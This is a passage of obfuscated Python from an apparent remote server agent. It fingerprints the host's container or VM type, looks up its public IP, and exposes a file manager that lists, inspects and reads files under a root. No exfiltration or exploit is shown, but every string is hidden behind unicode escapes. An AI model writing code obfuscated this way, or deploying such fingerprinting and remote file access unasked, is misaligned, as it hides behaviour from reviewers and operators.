                    elif O0_var_357.startswith(codecs.decode('\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e\\u005f\\u0049\\u0044\\u003d', 'unicode_escape')):
                        O0_var_356 = O0_var_357.replace(codecs.decode('\\u0056\\u0045\\u0052\\u0053\\u0049\\u004f\\u004e\\u005f\\u0049\\u0044\\u003d', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
                return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_355, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_356}
        except Exception:
            pass
        return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')}

    def _get_virtualization(self) -> str:

        def try_read(O0_var_358: str) -> str:
            try:
                if os.path.exists(O0_var_358):
                    with open(O0_var_358, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0069\\u0067\\u006e\\u006f\\u0072\\u0065', 'unicode_escape')) as O0_var_359:
                        return O0_var_359.read()
            except Exception:
                pass
            return codecs.decode('', 'unicode_escape')
        if platform.system() != codecs.decode('\\u004c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape'):
            return codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')
        try:
            if os.path.exists(codecs.decode('\\u002f\\u002f\\u002e\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape')):
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            if os.path.exists(codecs.decode('\\u002f\\u0072\\u0075\\u006e\\u002f\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0065\\u006e\\u0076', 'unicode_escape')):
                return codecs.decode('\\u0050\\u006f\\u0064\\u006d\\u0061\\u006e', 'unicode_escape')
            O0_var_360 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0031\\u002f\\u0063\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape')).lower()
            if codecs.decode('\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape') in O0_var_360 or codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0064', 'unicode_escape') in O0_var_360:
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            elif codecs.decode('\\u006b\\u0075\\u0062\\u0065\\u0070\\u006f\\u0064\\u0073', 'unicode_escape') in O0_var_360:
                return codecs.decode('\\u004b\\u0075\\u0062\\u0065\\u0072\\u006e\\u0065\\u0074\\u0065\\u0073', 'unicode_escape')
            elif codecs.decode('\\u006c\\u0078\\u0063', 'unicode_escape') in O0_var_360:
                return codecs.decode('\\u004c\\u0058\\u0043', 'unicode_escape')
            O0_var_360 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0073\\u0065\\u006c\\u0066\\u002f\\u006d\\u006f\\u0075\\u006e\\u0074\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'))
            if codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072\\u002f\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u0073\\u002f', 'unicode_escape') in O0_var_360 or codecs.decode('\\u0077\\u006f\\u0072\\u006b\\u0064\\u0069\\u0072\\u003d\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u0069\\u0062\\u002f\\u0064\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape') in O0_var_360:
                return codecs.decode('\\u0044\\u006f\\u0063\\u006b\\u0065\\u0072', 'unicode_escape')
            elif codecs.decode('\\u002f\\u0070\\u006f\\u0064\\u0073\\u002f', 'unicode_escape') in O0_var_360 or codecs.decode('\\u006b\\u0075\\u0062\\u0065\\u006c\\u0065\\u0074', 'unicode_escape') in O0_var_360:
                return codecs.decode('\\u004b\\u0075\\u0062\\u0065\\u0072\\u006e\\u0065\\u0074\\u0065\\u0073', 'unicode_escape')
            if codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0065\\u0072\\u003d\\u006c\\u0078\\u0063', 'unicode_escape') in try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0031\\u002f\\u0065\\u006e\\u0076\\u0069\\u0072\\u006f\\u006e', 'unicode_escape')):
                return codecs.decode('\\u004c\\u0058\\u0043', 'unicode_escape')
            O0_var_360 = try_read(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0063\\u0070\\u0075\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'))
            if codecs.decode('\\u0051\\u0045\\u004d\\u0055', 'unicode_escape') in O0_var_360 or codecs.decode('\\u004b\\u0056\\u004d', 'unicode_escape') in O0_var_360:
                return codecs.decode('\\u0051\\u0045\\u004d\\u0055', 'unicode_escape')
        except Exception as e:
            Logger.debug(codecs.decode('\\u83b7\\u53d6\\u865a\\u62df\\u5316\\u4fe1\\u606f\\u5931\\u8d25\\u0028\\u975e\\u81f4\\u547d\\u0029\\u003a\\u0020', 'unicode_escape') + str(e), 11)
        return codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')

    async def _get_public_ip_v4(self) -> Optional[str]:
        O0_var_361 = [codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u002e\\u0069\\u0070\\u0069\\u0066\\u0079\\u002e\\u006f\\u0072\\u0067', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0063\\u0061\\u006e\\u0068\\u0061\\u007a\\u0069\\u0070\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0063\\u0068\\u0065\\u0063\\u006b\\u0069\\u0070\\u002e\\u0061\\u006d\\u0061\\u007a\\u006f\\u006e\\u0061\\u0077\\u0073\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0066\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u002e\\u006d\\u0065\\u002f\\u0069\\u0070', 'unicode_escape')]
        for O0_var_362 in O0_var_361:
            try:
                O0_var_363 = await self._fetch_ip(O0_var_362)
                if O0_var_363 and self._is_valid_ipv4(O0_var_363):
                    return O0_var_363
            except Exception:
                continue
        return None

    async def _get_public_ip_v6(self) -> Optional[str]:
        O0_var_364 = [codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0061\\u0070\\u0069\\u0036\\u002e\\u0069\\u0070\\u0069\\u0066\\u0079\\u002e\\u006f\\u0072\\u0067', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0069\\u0063\\u0061\\u006e\\u0068\\u0061\\u007a\\u0069\\u0070\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')]
        for O0_var_365 in O0_var_364:
            try:
                O0_var_366 = await self._fetch_ip(O0_var_365)
                if O0_var_366 and self._is_valid_ipv6(O0_var_366):
                    return O0_var_366
            except Exception:
                continue
        return None

    async def _fetch_ip(self, O0_var_367: str) -> str:
        O0_var_368 = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=O0_var_368) as O0_var_369:
            async with O0_var_369.get(O0_var_367, headers={codecs.decode('\\u0075\\u0073\\u0065\\u0072\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): Config.AGENT_VERSION}) as response:
                if response.status == 200:
                    return (await response.text()).strip()
                raise Exception(codecs.decode('\\u0048\\u0054\\u0054\\u0050\\u0020', 'unicode_escape') + str(response.status))

    def _is_valid_ipv4(self, O0_var_370: str) -> bool:
        try:
            socket.inet_pton(socket.AF_INET, O0_var_370)
            return True
        except socket.error:
            return False

    def _is_valid_ipv6(self, O0_var_371: str) -> bool:
        try:
            O0_var_372 = ipaddress.IPv6Address(O0_var_371.split(codecs.decode('\\u0025', 'unicode_escape'))[0])
        except (ipaddress.AddressValueError, ValueError):
            return False
        if O0_var_372.ipv4_mapped is not None:
            return False
        return O0_var_372.is_global and (not O0_var_372.is_multicast)
import shutil
import stat
import hashlib
import mimetypes
import base64
import json
import zipfile
from pathlib import Path, PurePosixPath
from datetime import datetime, timezone
from typing import List, Dict, Optional, Union
from fastapi import HTTPException, status, UploadFile
from croniter import croniter
_FILE_ERROR_REASONS = {errno.EROFS: codecs.decode('\\u0072\\u0065\\u0061\\u0064\\u005f\\u006f\\u006e\\u006c\\u0079\\u005f\\u0066\\u0069\\u006c\\u0065\\u005f\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d', 'unicode_escape'), errno.EACCES: codecs.decode('\\u0070\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape'), errno.EPERM: codecs.decode('\\u0070\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape'), errno.ENOTDIR: codecs.decode('\\u006e\\u006f\\u0074\\u005f\\u0061\\u005f\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape'), errno.EEXIST: codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u005f\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073', 'unicode_escape'), errno.ENOENT: codecs.decode('\\u006e\\u006f\\u0074\\u005f\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape'), errno.ENOSPC: codecs.decode('\\u006e\\u006f\\u005f\\u0073\\u0070\\u0061\\u0063\\u0065', 'unicode_escape')}

def _file_error_reason(O0_var_373) -> str:
    O0_var_374 = set()
    while O0_var_373 is not None and id(O0_var_373) not in O0_var_374:
        O0_var_374.add(id(O0_var_373))
        O0_var_375 = _FILE_ERROR_REASONS.get(getattr(O0_var_373, codecs.decode('\\u0065\\u0072\\u0072\\u006e\\u006f', 'unicode_escape'), None))
        if O0_var_375:
            return O0_var_375
        O0_var_373 = O0_var_373.__cause__ or O0_var_373.__context__
    return codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')

def _file_batch_result(total: int, O0_var_376: int, O0_var_377: List[Dict[str, str]]) -> dict:
    if total > 0 and O0_var_376 == total:
        O0_var_378, O0_var_379 = (codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('', 'unicode_escape'))
    elif total == 0:
        O0_var_378, O0_var_379 = (codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u004e\\u006f\\u0020\\u006f\\u0070\\u0065\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0073\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'))
    elif O0_var_376 == 0:
        O0_var_378, O0_var_379 = (codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0041\\u006c\\u006c\\u0020', 'unicode_escape') + str(total) + codecs.decode('\\u0020\\u006f\\u0070\\u0065\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))
    else:
        O0_var_378, O0_var_379 = (codecs.decode('\\u0070\\u0061\\u0072\\u0074\\u0069\\u0061\\u006c', 'unicode_escape'), str(total - O0_var_376) + codecs.decode('\\u0020\\u006f\\u0066\\u0020', 'unicode_escape') + str(total) + codecs.decode('\\u0020\\u006f\\u0070\\u0065\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))
    O0_var_380 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): O0_var_378, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): total, codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_376}
    if O0_var_379:
        O0_var_380[codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape')] = O0_var_379
    O0_var_380[codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape')] = O0_var_377
    return O0_var_380

class FileOperationError(HTTPException):
    codecs.decode('\\u6587\\u4ef6\\u5199\\u5165\\u5931\\u8d25\\u003b\\u0020\\u72ec\\u7acb\\u5f02\\u5e38\\u5904\\u7406\\u5668\\u4fdd\\u7559\\u0020\\u0065\\u0072\\u0072\\u006e\\u006f\\u0020\\u8bed\\u4e49\\u002c\\u0020\\u4e0d\\u6539\\u53d8\\u5176\\u4ed6\\u0020\\u0048\\u0054\\u0054\\u0050\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u3002', 'unicode_escape')

    def __init__(self, message: str, O0_var_381: Exception, status_code: int=500):
        super().__init__(status_code=status_code, detail=message)
        self.reason = _file_error_reason(O0_var_381)

class _ZipSourceReadError(Exception):
    pass

class FileManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u6587\\u4ef6\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u5c01\\u88c5\\u6240\\u6709\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u64cd\\u4f5c\\u000a\\u0020\\u0020\\u0020\\u0020\\u5b89\\u5168\\u7279\\u6027\\u003a\\u0020\\u8def\\u5f84\\u6821\\u9a8c\\u3001\\u6743\\u9650\\u68c0\\u67e5\\u3001\\u5ba1\\u8ba1\\u65e5\\u5fd7\\u3001\\u5206\\u5757\\u4e0a\\u4f20\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, root: str, max_upload: int=104857600, chunk_size: int=20971520, audit: bool=True):
        self.O0_fn_106 = Path(root).resolve()
        self.max_upload = max_upload
        self.chunk_size = chunk_size
        self.audit = audit
        self.chunk_dir = self.O0_fn_106 / codecs.decode('\\u002e\\u0070\\u0072\\u006f\\u0078\\u0079\\u005f\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape')
        self.chunk_dir.mkdir(exist_ok=True)

    def _audit(self, O0_var_382: str, path: str, O0_var_383: str, O0_var_384: dict=None):
        if self.audit:
            O0_var_385 = {codecs.decode('\\u0074\\u0073', 'unicode_escape'): datetime.utcnow().isoformat(), codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_382, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): path, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): O0_var_383, **(O0_var_384 or {})}
            if os.getenv(codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape'):
                Logger.debug(codecs.decode('\\U0001f4dd\\u0020\\u005b\\u0041\\u0055\\u0044\\u0049\\u0054\\u005d\\u0020', 'unicode_escape') + str(json.dumps(O0_var_385, ensure_ascii=False)))

    def _safe_path(self, O0_var_386: str) -> Path:
        O0_var_386 = (O0_var_386 or codecs.decode('\\u002e', 'unicode_escape')).strip()
        O0_var_387 = Path(O0_var_386)
        if not O0_var_387.is_absolute():
            O0_var_387 = self.O0_fn_106 / O0_var_387
        O0_var_387 = O0_var_387.resolve()
        try:
            O0_var_387.relative_to(self.O0_fn_106)
        except ValueError:
            raise HTTPException(status_code=403, detail=codecs.decode('\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064\\u003a\\u0020\\u0027', 'unicode_escape') + str(O0_var_386) + codecs.decode('\\u0027\\u0020\\u006f\\u0075\\u0074\\u0073\\u0069\\u0064\\u0065\\u0020\\u0072\\u006f\\u006f\\u0074\\u0020\\u0027', 'unicode_escape') + str(self.O0_fn_106) + codecs.decode('\\u0027', 'unicode_escape'))
        return O0_var_387

    def _validate_parent_directory(self, target: Path):
        O0_var_388 = target.parent
        while O0_var_388 != self.O0_fn_106 and (not O0_var_388.exists()) and (O0_var_388.parent != O0_var_388):
            O0_var_388 = O0_var_388.parent
        if O0_var_388.exists() and (not O0_var_388.is_dir()):
            raise NotADirectoryError(errno.ENOTDIR, codecs.decode('\\u0050\\u0061\\u0072\\u0065\\u006e\\u0074\\u0020\\u0070\\u0061\\u0074\\u0068\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape'), str(O0_var_388))

    def _format_info(self, path: Path) -> dict:
        try:
            O0_var_389 = path.lstat() if path.is_symlink() else path.stat()
            return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): path.name, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(path.relative_to(self.O0_fn_106)), codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape') if path.is_dir() else codecs.decode('\\u0073\\u0079\\u006d\\u006c\\u0069\\u006e\\u006b', 'unicode_escape') if path.is_symlink() else codecs.decode('\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_389.st_size, codecs.decode('\\u006d\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): datetime.fromtimestamp(O0_var_389.st_mtime).isoformat(), codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): stat.filemode(O0_var_389.st_mode), codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): oct(stat.S_IMODE(O0_var_389.st_mode)), codecs.decode('\\u006f\\u0077\\u006e\\u0065\\u0072', 'unicode_escape'): str(O0_var_389.st_uid) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_389.st_gid)}
        except Exception as e:
            return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): path.name, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(path), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)}

    def list_files(self, base_path: str, recursive: bool=False) -> dict:
        O0_var_390 = self._safe_path(base_path)
        if not O0_var_390.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(base_path))
        if not O0_var_390.is_dir():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u003a\\u0020', 'unicode_escape') + str(base_path))
        O0_var_391 = []
        try:
            O0_var_392 = O0_var_390.rglob(codecs.decode('\\u002a', 'unicode_escape')) if recursive else O0_var_390.iterdir()
            for O0_var_393 in O0_var_392:
                if not recursive and O0_var_393.parent != O0_var_390:
                    continue
                O0_var_391.append(self._format_info(O0_var_393))
        except PermissionError:
            raise HTTPException(403, codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(base_path))
        O0_var_391.sort(key=lambda x: (x.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')) != codecs.decode('\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape'), x.get(codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')).lower()))
        self._audit(codecs.decode('\\u006c\\u0069\\u0073\\u0074', 'unicode_escape'), base_path, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_391)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_391), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_391}

    @staticmethod
    def _mount_readonly_from_mountinfo(target: str, data: Union[bytes, str]) -> Optional[bool]:
        target = posixpath.normpath(target or codecs.decode('', 'unicode_escape'))
        if not posixpath.isabs(target):
            return None
        try:
            if isinstance(data, bytes):
                O0_var_394 = data.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0073\\u0075\\u0072\\u0072\\u006f\\u0067\\u0061\\u0074\\u0065\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065', 'unicode_escape'))
            elif isinstance(data, str):
                O0_var_394 = data
            else:
                return None
        except UnicodeError:
            return None
        O0_var_395 = {codecs.decode('\\u0030\\u0034\\u0030', 'unicode_escape'): codecs.decode('\\u0020', 'unicode_escape'), codecs.decode('\\u0030\\u0031\\u0031', 'unicode_escape'): codecs.decode('\\u0009', 'unicode_escape'), codecs.decode('\\u0030\\u0031\\u0032', 'unicode_escape'): codecs.decode('\\u000a', 'unicode_escape'), codecs.decode('\\u0031\\u0033\\u0034', 'unicode_escape'): codecs.decode('\\u005c', 'unicode_escape')}
        O0_var_396 = -1
        O0_var_397 = None
        for O0_var_398 in O0_var_394.splitlines():
            O0_var_399 = O0_var_398.split()
            if len(O0_var_399) < 6:
                continue
            O0_var_400 = posixpath.normpath(re.sub(codecs.decode('\\u005c\\u005c\\u0028\\u0030\\u0034\\u0030\\u007c\\u0030\\u0031\\u0031\\u007c\\u0030\\u0031\\u0032\\u007c\\u0031\\u0033\\u0034\\u0029', 'unicode_escape'), lambda match: O0_var_395[match.group(1)], O0_var_399[4]))
            if not posixpath.isabs(O0_var_400):
                continue
            if target != O0_var_400 and (not target.startswith(O0_var_400.rstrip(codecs.decode('\\u002f', 'unicode_escape')) + codecs.decode('\\u002f', 'unicode_escape'))):
                continue
            if len(O0_var_400) <= O0_var_396:
                continue
            O0_var_397 = codecs.decode('\\u0072\\u006f', 'unicode_escape') in O0_var_399[5].split(codecs.decode('\\u002c', 'unicode_escape'))
            O0_var_396 = len(O0_var_400)
        return O0_var_397

    def get_authority(self, O0_var_401: List[str]) -> dict:
        O0_var_402 = None
        if sys.platform.startswith(codecs.decode('\\u006c\\u0069\\u006e\\u0075\\u0078', 'unicode_escape')):
            try:
                with open(codecs.decode('\\u002f\\u0070\\u0072\\u006f\\u0063\\u002f\\u0073\\u0065\\u006c\\u0066\\u002f\\u006d\\u006f\\u0075\\u006e\\u0074\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), codecs.decode('\\u0072\\u0062', 'unicode_escape')) as O0_var_403:
                    O0_var_402 = O0_var_403.read()
            except OSError:
                pass
        O0_var_404 = []
        for O0_var_405 in O0_var_401:
            try:
                O0_var_406 = self._safe_path(O0_var_405)
                if not O0_var_406.exists():
                    O0_var_404.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_405, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                O0_var_407 = self._format_info(O0_var_406)
                O0_var_408 = {codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_407[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')], codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_407[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')], codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_407.get(codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape')), codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_407.get(codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape')), codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): O0_var_407.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')), codecs.decode('\\u0072\\u0065\\u0061\\u0064\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_406, os.R_OK), codecs.decode('\\u0077\\u0072\\u0069\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_406, os.W_OK), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_406, os.X_OK)}
                if O0_var_402 is not None:
                    O0_var_409 = os.path.realpath(O0_var_406)
                    O0_var_410 = self._mount_readonly_from_mountinfo(O0_var_409, O0_var_402)
                    if O0_var_410 is not None:
                        O0_var_408[codecs.decode('\\u006d\\u006f\\u0075\\u006e\\u0074\\u005f\\u0072\\u0065\\u0061\\u0064\\u006f\\u006e\\u006c\\u0079', 'unicode_escape')] = O0_var_410
                O0_var_404.append(O0_var_408)
            except HTTPException as e:
                O0_var_404.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_405, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_404.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_405, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        self._audit(codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), str(O0_var_401), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0071\\u0075\\u0065\\u0072\\u0069\\u0065\\u0064', 'unicode_escape'): len(O0_var_401)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_404}

    def cat_file(self, file_path: str, O0_var_411: int=1048576) -> dict:
        O0_var_412 = self._safe_path(file_path)
        if not O0_var_412.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if not O0_var_412.is_file():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if O0_var_412.stat().st_size > O0_var_411:
            raise HTTPException(413, codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065\\u0020\\u0066\\u006f\\u0072\\u0020\\u0063\\u0061\\u0074\\u0020\\u0028\\u003e\\u0031\\u004d\\u0042\\u0029\\u003a\\u0020', 'unicode_escape') + str(file_path))
        try:
            O0_var_413 = O0_var_412.read_text(encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
            O0_var_414 = codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')
            O0_var_415 = False
        except:
            O0_var_413 = base64.b64encode(O0_var_412.read_bytes()).decode()
            O0_var_414 = codecs.decode('\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape')
            O0_var_415 = True
